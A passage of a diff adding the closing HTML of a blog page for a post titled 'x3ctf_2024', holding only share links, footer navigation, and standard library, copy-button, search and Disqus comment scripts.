+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&title=x3ctf_2024"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&is_video=false&description=x3ctf_2024"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=x3ctf_2024&body=Check out this article: https://kc1zs4.github.io/2025/01/27/x3ctf_2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&title=x3ctf_2024"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&title=x3ctf_2024"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&title=x3ctf_2024"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&title=x3ctf_2024"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&name=x3ctf_2024&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&t=x3ctf_2024"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
